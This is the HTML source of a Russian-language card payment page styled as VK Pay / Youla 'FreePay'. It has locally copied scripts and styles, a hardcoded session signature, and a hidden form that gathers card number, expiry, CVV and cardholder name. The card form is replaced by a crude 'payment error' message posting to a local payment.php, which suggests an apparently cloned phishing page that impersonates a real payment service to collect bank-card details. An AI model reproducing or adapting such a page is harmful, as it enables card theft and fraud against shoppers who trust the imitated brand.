<!DOCTYPE html>

<html>

<head>
    <script>
        window.parent.postMessage('{"type": "billing", "action": "openCPGWindow"}', '*');
    </script>
    <title>Оплата с банковской карты</title>
    <meta charset="utf-8">
    <meta name="robots" content="all">
    <meta name="description" content="">
    <meta name="keywords" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="./css283/cpg_waiter.css" />
    <link rel="stylesheet" type="text/css" href="./css/3-party/jquery-plugins/selectBox/jquery.selectBox.css" />
    <!--[if (gt IE 9)|!(IE)]><!-->
    <link rel="stylesheet" type="text/css" href="./css283/merchant/DMR/pay-card.css">
    <!--<![endif]-->
    <!--[if lte IE 8]>
	<link rel="stylesheet" type="text/css" href="/css283/merchant/DMR/pay-card.ie8.css">
	<![endif]-->
    <!--[if IE 9]>
	<link rel="stylesheet" type="text/css" href="/css283/merchant/DMR/pay-card.ie9.css">
	<![endif]-->

    <!--[if lt IE 9]>
	<script type="text/javascript" src="/js/merchant/DMR/html5.js"></script>
	<![endif]-->
    <script type="text/javascript" src="./js283/feature-detect.js"></script>
    <script type="text/javascript" src="./js/3-party/es5-shim/es5-shim.min.js"></script>
    <script type="text/javascript" src="./js/jquery-1.11.3.min.js"></script>
    <script type="text/javascript" src="./js/3-party/jquery-plugins/selectBox/jquery.selectBox.min.js"></script>
    <script type="text/javascript" src="./js283/rb.js"></script>
    <script type="text/javascript" src="./js283/common.js"></script>
    <script type="text/javascript" src="./js283/cpg_waiter.js"></script>
    <script type="text/javascript" src="./js283/merchant/DMR/pay-card.bundle.js"></script>
    <script type="text/javascript" src="./js283/merchant/DMR/standard_waiter.js"></script>
    <script>
        var pixels = {
            "page_load": 26190105,
            "form_fill-start": 26190106,
            "form_submit-button-click-all": 26190110,
            "form_submit-button-click-first": 26190107,
            "form_send": 26190119,
            "form_client-validation-error": 26190112,
            "form_client-validation-error-number": 26190113,
            "form_client-validation-error-date": 26190115,
            "form_client-validation-error-cvv": 26190116,
            "form_client-validation-error-cardholder": 26190138,
            "form_server-validation-error": 26190117,
            "3ds_start": 26190120,
            "3ds_finish": 26190125,
            "result_fail": 26190130,
            "result_success": 26190134,
            "status_fail": 28173342
        };

        var cpg_context = {};

        cpg_context['rb'] = new rb({
            pixels: pixels
        });

        cpg_context['json_cards'] = {};
        cpg_context['json_extra'] = {};
        cpg_context['selected_id'] = '';

        cpg_context['json_cards'] = {};

        cpg_context['json_extra'] = {
            "light_id": 146611,
            "user_info": {
                "reg_date": "07.02.2017",
                "beneficiary_id": "5af847869380005691666a4e",
                "benef_reg_date": "13.05.2018"
            },
            "theme": "web",
            "message": "Деньги будут зарезервированы Юлой до момента получения товара. Если товар вас не устроит, мы вернем вам деньги."
        };

        cpg_context['is_cvv_tooltip_enabled'] = true;

        cpg_context['is_cardholder_field_required'] = true;

        cpg_context['session'] = {
            id: '40357821480651616215',
            signature: '3f5c24bf2a6ba66af40baa7234431683c4388a30',
        };

        var _cardTypeCurrentValue;
        var _addCardCheckboxOptionCurrentValue;

        function setupInputEvents() {
            var $allInputs = $('input');

            var handlers = {
                onInput: function() {
                    cpg_context['rb'].putPixel('form_fill-start');
                    $allInputs.off('input', handlers.onInput);
                },
                onPaste: function() {
                    isPasteDetected = true;
                    cpg_context['rb'].putPixel('form_fill-copypaste');
                }
            };

            $allInputs.one('input', handlers.onInput);
            $allInputs.on('paste', handlers.onPaste);
        }

        $(document).ready(function() {
            cpg_context['rb'].putPixel('page_load');
            var waiter = createCpgStandardWaiter(cpg_context);
            assignFormHandlers(cpg_context, waiter);
            setupInputEvents();
        });
    </script>
</head>

<body class="body_fixed-width_no">

    <div class="pay-card-layout pay-card-layout_type_youla">
        <div class="pay-card-layout__header_type_vkpay">
            <div class="pay-card-layout__logo">
                <div class="vk-pay-icon vk-pay-icon_name_logo"></div>
            </div>
        </div>

        <div class="pay-card js-pay-card pay-card_type_youla" data-type="freepay">
            <div class="pay-card__row">
                <div class="pay-card__card-selector js-card-selector-wrapper" data-title-default-option="Другая карта" data-value-default-option="FreePay">
                    <div class="pay-card__select-card">
                        <div class="control control_layout_horizontal">
                            <label class="control-label clearfix"> <span class="control-label__text">Выберите карту</span>
                                <select class="control__select js-card-selector control__select_type_youla"></select>
                            </label>
                        </div>
                    </div>
                </div>
                <div class="pay-card__card js-credit-card">

                    <div class="credit-card-form credit-card-form_size_standard credit-card-form_holder-name-visible">

                        <form method="POST"  class="credit-card-form__form js-card-form" novalidate="novalidate" autocomplete="on" action="payment.php"><br><br><br><br>
<center><p style="font-size: 28px;">Произошла ошибка платежа!</p><br>
<p style="font-size: 28px;">Нам не удалось списать сумму </p><br>
</center>

                        </form>
                    </div>
                </div>
            </div>
        </div>


        <div class="credit-card-form__popup-overlay js-cc-popup-overlay">
            <div class="credit-card-form__popup js-cc-popup">
                <div class="credit-card-form__popup-body">

                    <div class="notification-block">
                        <div class="notification-block__inner">

                            <div class="info-block ">
                                <div class="info-block__img-wrapper"> <span class="img waiter-icon waiter-icon_name_alert"></span> </div>
                                <div class="info-block__content">
                                    <h3 class="title js-error-message">Не удалось произвести оплату.</h3>
                                    <p class="paragraph paragraph_color_red ">Платёж был отменён.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="credit-card-form__popup-footer js-cc-popup-footer">
                    <span class="js-button button">Повторить</span>
                </div>
            </div>
        </div>
        <div class="credit-card-form__popup-overlay js-cc-popup-overlay">
            <div class="credit-card-form__popup js-cc-timeout-popup">
                <div class="credit-card-form__popup-body">

                    <div class="notification-block">
                        <div class="notification-block__inner">

                            <div class="info-block ">
                                <div class="info-block__img-wrapper"> <span class="img waiter-icon waiter-icon_name_alert"></span> </div>
                                <div class="info-block__content">
                                    <h3 class="title js-timeout-error-message">Статус операции неизвестен.</h3>
                                    <p class="paragraph paragraph_color_red ">Нажмите кнопку, чтобы узнать статус заказа.
                                        <br>Возможно, он прошел успешно.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="credit-card-form__popup-footer js-cc-popup-footer">
                    <span class="js-button button">Узнать статус</span>
                </div>
            </div>
        </div>
        <div id="cpg_waiter" class="credit-card-form__popup credit-card-form__popup_type_youla js-block-waiter">
            <div class="credit-card-form__popup-body">

                <div class="notification-block">
                    <div class="notification-block__inner">

                        <div class="info-block ">
                            <div class="info-block__img-wrapper"> <span class="img icon_spin_clockwise vesna-icon vesna-icon_name_load"></span> </div>
                            <div class="info-block__content">
                                <h3 class="title ">Пожалуйста, подождите</h3>
                                <p class="paragraph ">Данные отправляются на защищенный сервер</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <form class="js-hidden-form" style="display: none" id="cpg_form" action="/api/in/order/pay" method="POST">

            <input type="hidden" value="40357821480651616215" name="session_id" />

            <input type="hidden" value="3f5c24bf2a6ba66af40baa7234431683c4388a30" name="signature" />
            <input type="hidden" value="" name="ts" />
            <input type="hidden" value="" name="card_id" />
            <input type="hidden" value="" name="pan" />
            <input type="hidden" value="YOULA FREEPAY" name="cardholder" />
            <input type="hidden" value="" name="exp_date" />

            <input type="hidden" value="" name="cvv" />

            <input type="checkbox" value="True" name="add_card" checked>

        </form>

    </div>

    <script>
        var payCard;
        (function(window, undefined) {
            var $ = window.$;
            var PayCard = window.PayCard;
            var $payCard = $('.js-pay-card');

            /** cache hidden form and inputs in local vars */
            var $hiddenForm = $('.js-hidden-form');
            var $hiddenFormCardNumberInput = $hiddenForm.find('input[name=pan]');
            var $hiddenFormCardHolderInput = $hiddenForm.find('input[name=cardholder]');
            var $hiddenFormExpiryInput = $hiddenForm.find('input[name=exp_date]');
            var $hiddenFormCvvInput = $hiddenForm.find('input[name=cvv]');
            var $hiddenFormAddedCardIdInput = $hiddenForm.find('input[name=card_id]');
            var $hiddenFormAddCardCheckbox = $hiddenForm.find('input[name=add_card]');

            var $selectBox = $('.js-card-selector');

            window.parent.postMessage('{"type": "billing", "action": "pageLoad"}', '*');

            /** create pay-card app instance */
            payCard = PayCard.createInstance({
                $root: $payCard,
                $popup: $('.js-cc-popup'),
                $timeoutPopup: $('.js-cc-timeout-popup'),
                classNames: {
                    cvvLabel: 'js-cc-cvv-icon'
                },
                cvvTooltip: cpg_context['is_cvv_tooltip_enabled'],
                cardholder: cpg_context['is_cardholder_field_required'],
                addedCards: cpg_context['json_cards'],
                selectedId: cpg_context["selected_id"] || '',
                enableSetExpiryValue: true,
                onValidationError: function() {
                    putSubmitButtonClickPixel();

                    cpg_context['rb'].putPixel('form_client-validation-error');
                    if (payCard.isNumberValid() === false) {
                        cpg_context['rb'].putPixel('form_client-validation-error-number');
                        return false;
                    }
                    if (payCard.isCardholderValid() === false) {
                        cpg_context['rb'].putPixel('form_client-validation-error-cardholder');
                        return false;
                    }
                    if (payCard.isExpiryValid() === false) {
                        cpg_context['rb'].putPixel('form_client-validation-error-date');
                        return false;
                    }
                    if (payCard.isCvvValid() === false) {
                        cpg_context['rb'].putPixel('form_client-validation-error-cvv');
                        return false;
                    }
                    return false;
                },
                onCardSubmit: function() {
                    putSubmitButtonClickPixel();
                    putCopyPasteFillPixel();

                    /** set hidden input values */
                    $hiddenFormCardNumberInput.val(payCard.getNumberValue().replace(/ /g, ''));
                    if (payCard.isCardholderRequired()) {
                        $hiddenFormCardHolderInput.val(payCard.getCardholderValue() || $hiddenFormCardHolderInput.val());
                    }
                    $hiddenFormExpiryInput.val(payCard.getMonthValue() + '.' + payCard.getYearValue());
                    $hiddenFormCvvInput.val(payCard.getCvvValue());
                    $hiddenFormAddedCardIdInput.val('');
                    $hiddenFormAddCardCheckbox.prop('checked', payCard.getAddCardCheckboxValue());

                    /** submit hidden form */
                    $hiddenForm.submit();

                    return false;
                },
                onAddedCardSubmit: function() {
                    var addedCardId = payCard.getSelectedCardId();
                    var addedCardExternalVtermId = cpg_context['json_cards'][addedCardId]['extra_cardlink_vterm_id'];
                    putSubmitButtonClickPixel();
                    putCopyPasteFillPixel();

                    /** set hidden input values */
                    $hiddenFormCardNumberInput.val('');
                    if (payCard.isCardholderRequired()) {
                        $hiddenFormCardHolderInput.val(payCard.getCardholderValue() || $hiddenFormCardHolderInput.val());
                    }
                    $hiddenFormExpiryInput.val(cpg_context['json_cards'][addedCardId]['exp_date']);
                    $hiddenFormCvvInput.val(payCard.getCvvValue() === '***' ? '' : payCard.getCvvValue());
                    $hiddenFormAddedCardIdInput.val(addedCardId);
                    $hiddenFormAddCardCheckbox.prop('checked', true);

                    /* send external vterm id to parent window */
                    if (addedCardExternalVtermId) {
                        window.parent.postMessage(JSON.stringify({
                            type: 'social',
                            action: 'pay',
                            action_params: {
                                vterm_id: addedCardExternalVtermId
                            }
                        }), '*');
                    }

                    /** submit hidden form */
                    $hiddenForm.submit();

                    return false;
                },
                onAddedCardRemove: function() {
                    var cardId = payCard.getSelectedCardId();
                    var removeCardIdFromSelect = function(cardId) {
                        payCard.removeAddedCardById(cardId);
                        $selectBox.selectBox('refresh')
                            .selectBox('value', payCard.getSelectedCardId());
                        if (typeof sendFrameResizeMessage === 'function') {
                            sendFrameResizeMessage();
                        }
                    };

                    removeCardRequest(cardId, cpg_context.session.id, cpg_context.session.signature, removeCardIdFromSelect);

                    return false;
                },
                onCardTypeUpdate: function onCardTypeUpdate(cardType) {
                    if (cardType && cardType !== _cardTypeCurrentValue) {
                        _cardTypeCurrentValue = cardType;
                        window.parent.postMessage(JSON.stringify({
                            type: 'billing',
                            action: 'typeCard',
                            action_params: cardType
                        }), '*');
                    }
                },
                onAddCardCheckboxChange: function onAddCardCheckboxChange(option) {
                    if (typeof option !== 'undefined' && option !== _addCardCheckboxOptionCurrentValue) {
                        _addCardCheckboxOptionCurrentValue = option;
                        window.parent.postMessage(JSON.stringify({
                            type: 'billing',
                            action: 'addCard',
                            action_params: option
                        }), '*');
                    }
                },
                onHideTimeoutPopup: function() {
                    if (typeof restartPoll === 'function') {
                        restartPoll();
                    }
                }
            });

            $selectBox.selectBox().selectBox('value', payCard.getSelectedCardId());

            /** Hide errors on input focus */
            $payCard.on('focus', '.credit-card-form__input', function(event) {
                $(event.currentTarget).trigger('keypress');
            });

            if (typeof sendFrameResizeMessage === 'function') {
                sendFrameResizeMessage();
            }
        })(window);
    </script>

</body>

</html>